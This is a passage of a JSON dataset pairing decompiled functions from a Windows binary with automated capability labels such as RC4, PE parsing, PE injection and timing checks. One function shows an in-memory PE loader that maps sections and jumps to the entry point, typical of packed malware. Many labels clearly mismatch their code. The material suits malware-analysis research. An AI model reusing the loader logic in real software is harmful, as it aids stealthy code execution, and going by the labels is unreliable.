            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047e250(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004038d4();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.004038d4();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0047e224": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047e224(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0047f294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_c0h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_b8h\n// WARNING: Variable defined which should be unmapped: var_b4h\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a4h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_d0h\n// WARNING: Variable defined which should be unmapped: var_cch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0047f294(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar3 = 0x1a;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_1ch = 0x47fd5f;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.0040461c();\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(var_ch);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    *0x485fd4 = *(var_4h + 0x3c) + var_4h;\n    fcn.0040461c();\n    fcn.00404948(0x47fe0c, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x47fe00, *0x485e7c);\n    uVar2 = fcn.00404a88();\n    *0x485e70 = func_0x00406da4(uVar2);\n    fcn.00437534();\n    uVar2 = fcn.00404a88();\n    *0x485e80 = sub.kernel32.dll_GetProcAddress_1(*0x485e70, uVar2);\n    *0x485fcc = (**0x485e80)(0, *(*0x485fd4 + 0x50), 0x2000, 1);\n    *0x485fd0 = *0x485fcc - *(*0x485fd4 + 0x34);\n    *0x485fe0 = (**0x485e80)(*0x485fcc, *(*0x485fd4 + 0x54), 0x1000, 4);\n    fcn.00402d34();\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fd90);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x47fdb4, 0x47fe60, *0x485fc8, 0x47fe54, 0x47fe48, 0x47fe3c, 0x47fe30, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fda8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    *0x485fd8 = *0x485fd4 + 0x18 + *(*0x485fd4 + 0x14);\n    uVar4 = *(*0x485fd4 + 6);\n    if (-1 < uVar4 - 1) {\n        *0x485fdc = 0;\n        do {\n            uVar1 = *(*0x485fd8 + 8 + *0x485fdc * 0x28);\n            *0x485fe8 = *(*0x485fd8 + 0x10 + *0x485fdc * 0x28);\n            *0x485fe4 = uVar1;\n            if (uVar1 < *0x485fe8) {\n                *0x485fe4 = *0x485fe8;\n                *0x485fe8 = uVar1;\n            }\n            *0x485fe0 = (**0x485e80)(*(*0x485fd8 + 0xc + *0x485fdc * 0x28) + *0x485fcc, *0x485fe4, 0x1000, 4);\n            fcn.004031a8();\n            fcn.00402d34();\n            *0x485fdc = *0x485fdc + 1;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fd90);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fdcc);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x47fdb4, 0x47fe60, *0x485fc8, 0x47fe54, 0x47fe48, 0x47fe3c, 0x47fe30, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fdb4);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    *0x485ff0 = *(*0x485fd4 + 0x28) + *0x485fcc;\n    *0x485fec = *0x485fcc;\n    fcn.00404948(0x47fe90, 0, 0, 0x47fe84, 0, 0, 0x47fdd8, 0, 0, 0x47fe78, 0, 0, 0x47fda8, 0, 0, 0x47fdd8, 0, 0, \n                 0x47fdc0, 0, 0, 0x47fdd8, 0, 0, 0x47fdb4, 0, 0, 0x47fe6c, 0, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fe00);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x47fde4, 0, 0x47fdb4, 0, 0x47fdd8, 0, 0x47fdcc, 0, 0x47fdc0, 0, 0x47fd90, 0, 0x47fdb4, 0, 0x47fda8, 0\n                 , 0x47fd9c, 0, 0x47fd90, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x47fdb4, 0x47fe60, *0x485fc8, 0x47fe54, 0x47fe48, 0x47fe3c, 0x47fe30, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.0047efec();\n    fcn.00404948(0x47fdb4, 0x47fe60, *0x485fc8, 0x47fe54, 0x47fe48, 0x47fe3c, 0x47fe30, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x47fdcc, 0, 0, 0x47fe90, 0, 0, 0x47feb4, 0, 0, 0x47feb4, 0, 0, 0x47fea8, 0, 0, 0x47fe9c, 0, 0, \n                 0x47fdb4, 0, 0, 0x47fda8, 0, 0, 0x47fd9c, 0, 0, 0x47fd90, 0, 0, 0, *0x485fc8, 0x47fd84);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x47fe0c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.0047f120();\n    uVar4 = *(*0x485fd4 + 6);\n    if (-1 < uVar4 - 1) {\n        *0x485fdc = 0;\n        do {\n            *0x485e88 = sub.kernel32.dll_GetProcAddress_1(*0x485e70, 0x47feb8);\n            iVar3 = *0x485fdc;\n            uVar2 = func_0x0047efbc(0x485fc0);\n            (**0x485e88)(*(*0x485fd8 + 0xc + iVar3 * 0x28) + *0x485fcc, *(*0x485fd8 + 8 + iVar3 * 0x28), uVar2);\n            *0x485fdc = *0x485fdc + 1;\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    iVar3 = *0x485fcc;\n    (**0x485ff0)(*0x485fcc, 1, 0);\n    *in_FS_OFFSET = iVar3;\n    fcn.004045ec(0x47fd66);\n    return;\n}\n",
        "token_count": 4277
    },
    "0043b05c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043b05c(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
    "0045ee54": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0045ee54(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint *puStack52;\n    int32_t var_28h;\n    uint *var_24h;\n    uchar *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_20h = &stack0xfffffffc;\n    var_10h = 4;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_8h = 0;\n    var_24h = 0x45efd9;\n    var_28h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_28h;\n    if (arg_14h < arg_10h) {\n        var_20h = &stack0xfffffffc;\n        var_9h = fcn.0045e9b4();\n        var_10h = arg_14h + -1;\n        if ((var_9h & 1) != 0) {\n            var_10h = var_8h + -1;\n        }\n        fcn.00404ae8(arg_8h);\n        arg_10h = arg_10h - (arg_14h - var_8h);\n        if (0 < arg_10h) {\n            do {\n                fcn.004047b0();\n                fcn.00404890();\n                arg_10h = arg_10h + -1;\n            } while (arg_10h != 0);\n        }\n        puStack52 = &var_18h;\n        fcn.00404888();\n        fcn.00404ae8();\n        fcn.00404890();\n    }\n    else if (arg_10h < arg_14h) {\n        var_20h = &stack0xfffffffc;\n        var_1ch = unaff_EDI;\n        var_9h = fcn.0045e9b4();\n        if ((var_9h & 1) == 0) {\n            fcn.00404888(&var_24h);\n            fcn.00404ae8();\n            puStack52 = var_24h;\n            fcn.00404ae8(&var_28h);\n            fcn.004048d4();\n        }\n        else {\n            fcn.00404888(&var_1ch);\n            fcn.00404ae8();\n            puStack52 = var_1ch;\n            fcn.00404ae8(&var_20h);\n            fcn.004048d4();\n        }\n    }\n    else {\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = puStack52;\n    var_28h = 0x45efe0;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 745
    },
    "004236b4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004236b4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x423717;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 292
    },
    "00426b18": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00426b18(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00403bc0();\n    fcn.0041c8c4();\n    fcn.004270cc();\n    fcn.00403820();\n    fcn.00403820();\n    fcn.00403820();\n    sub.kernel32.dll_DeleteCriticalSection_1(iVar1 + 0x38);\n    fcn.0041cabc();\n    if ('\\0' < extraout_DL) {\n        fcn.00403ba8();\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00426ca8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426ca8(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00427120();\n    uVar1 = fcn.00426938();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 109
    },
    "00426ce4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426ce4(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00427120();\n    uVar1 = fcn.00426938();\n    sub.user32.dll_FrameRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 108
    },
    "00426e2c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426e2c(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.00427120();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00428ed0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428ed0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        fcn.00403820();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.00403a40();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.00403a40();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.00403a28();\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0043ac00": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ac00(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 4) = *(param_2 + 4);\n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x20) = *(param_2 + 0x20);\n    *(in_EAX + 0x24) = *(param_2 + 0x24);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    return;\n}\n",
        "token_count": 249
    },
    "004411cc": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004411cc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00407634(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x180) = uVar1;\n    return;\n}\n",
        "token_count": 152
    },
    "00410c5c": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410c5c(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x484728)();\n            fcn.0041011c();\n        }\n        else {\n            fcn.0040fc88();\n        }\n    }\n    else {\n        fcn.00410d48();\n        (***0x484728)();\n        fcn.0041011c();\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "00414e38": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nuint32_t fcn.00414e38(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xffff0fff;\n    if (0x14 < uVar1) {\n        if (uVar1 == 0x100) {\n            uVar1 = CONCAT22(uVar1 >> 0x10, 8);\n        }\n        else {\n            fcn.0040fd24();\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 115
    },
    "00415710": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415710(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    \n    uVar1 = *in_EAX;\n    uVar2 = *param_2;\n    if ((uVar1 < 0x10f) && (uVar2 < 0x10f)) {\n        fcn.00415164();\n        return;\n    }\n    if (uVar1 == 0x400c) {\n        fcn.00415710();\n    }\n    else if (uVar2 == 0x400c) {\n        fcn.00415710();\n    }\n    else if (((uVar1 & 0xfff) < 0x10f) && ((uVar2 & 0xfff) < 0x10f)) {\n        fcn.00415164();\n    }\n    else {\n        fcn.004152f0();\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "00404414": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.00404414(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x483000;\n    *0x483000 = 0;\n    puVar3 = *0x485638;\n    puVar4 = 0x485638;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 166
    },
    "0040e44c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040e44c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 56
    },
    "0041d440": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d440(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004039b8();\n    if (cVar1 == '\\0') {\n        fcn.0041c444();\n    }\n    fcn.0041c358();\n    *(param_2 + 4) = in_EAX;\n    *(param_2 + 8) = in_EAX[4];\n    in_EAX[4] = in_EAX[4] + 1;\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x14))();\n    fcn.0041d180();\n    fcn.0041cde4();\n    return;\n}\n",
        "token_count": 181
    },
    "0041e710": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e710(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[5] == in_EAX[6]) {\n        fcn.0041e63c();\n    }\n    if (in_EDX < in_EAX[5]) {\n        fcn.00402d34();\n    }\n    puVar1 = in_EAX[4] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.0040461c();\n    in_EAX[5] = in_EAX[5] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 195
    },
    "00428f7c": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428f7c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x428f97;\n        iVar1 = fcn.00403764();\n        piStack24 = 0x428f9c;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x428fa9;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x428fbb;\n        piStack24 = var_4h;\n        iVar1 = fcn.00403a40();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x428fd3;\n        piStack24 = var_4h;\n        iVar1 = fcn.00403a40();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x42900c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00403820();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.00403a28();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 386
    },
    "0042e958": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0042e958(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    while (0 < *(*(in_EAX + 0x10) + 8)) {\n        iVar1 = fcn.0042d8b8();\n        (**(**(iVar1 + 4) + 0x2c))();\n    }\n    (**(**(in_EAX + 0x10) + 8))();\n    (**(**(in_EAX + 0x14) + 8))();\n    (**(**(in_EAX + 0x18) + 8))();\n    return;\n}\n",
        "token_count": 141
    },
    "00446bfc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446bfc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.004460d8();\n    fcn.0044646c();\n    return;\n}\n",
        "token_count": 432
    },
    "00466078": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
